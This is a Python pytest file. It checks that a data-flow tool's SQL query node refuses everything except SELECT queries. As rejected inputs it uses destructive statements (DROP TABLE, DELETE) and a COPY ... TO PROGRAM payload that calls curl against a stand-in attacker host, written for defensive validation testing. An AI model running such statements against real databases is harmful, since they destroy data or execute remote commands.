"""Tests for SQL query validation in the sql_query node

Ensures that ``execute_sql_query`` and ``SqlQueryInput`` refuse unsafe SQL
before it reaches pl.SQLContext.
"""

from __future__ import annotations

import polars as pl
import pytest
from pydantic import ValidationError

from flowfile_core.flowfile.flow_data_engine.flow_data_engine import (
    FlowDataEngine,
    execute_sql_query,
)
from flowfile_core.flowfile.sources.external_sources.sql_source.sql_source import UnsafeSQLError
from flowfile_core.schemas.transform_schema import SqlQueryInput


class TestSqlQueryNodeValidation:
    """Validates that the sql_query node refuses dangerous SQL."""

    @pytest.fixture()
    def sample_engine(self) -> FlowDataEngine:
        lf = pl.LazyFrame({"id": [1, 2, 3], "name": ["a", "b", "c"]})
        return FlowDataEngine(lf)

    def test_drop_table_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError, match="Only SELECT queries"):
            execute_sql_query(sample_engine, sql_code="DROP TABLE input_1")

    def test_delete_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError, match="Only SELECT queries"):
            execute_sql_query(sample_engine, sql_code="DELETE FROM input_1 WHERE id = 1")

    def test_copy_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError):
            execute_sql_query(sample_engine, sql_code="COPY (SELECT * FROM input_1) TO PROGRAM 'curl evil.com'")

    def test_valid_select_passes(self, sample_engine: FlowDataEngine) -> None:
        result = execute_sql_query(sample_engine, sql_code="SELECT * FROM input_1")
        assert result.data_frame.collect().shape[0] == 3

    def test_pydantic_validator_rejects_drop(self) -> None:
        with pytest.raises(ValidationError) as exc_info:
            SqlQueryInput(sql_code="DROP TABLE users")
        assert "UnsafeSQLError" in str(exc_info.value) or "Only SELECT" in str(exc_info.value)

    def test_pydantic_validator_accepts_select(self) -> None:
        inp = SqlQueryInput(sql_code="SELECT id, name FROM users")
        assert inp.sql_code == "SELECT id, name FROM users"
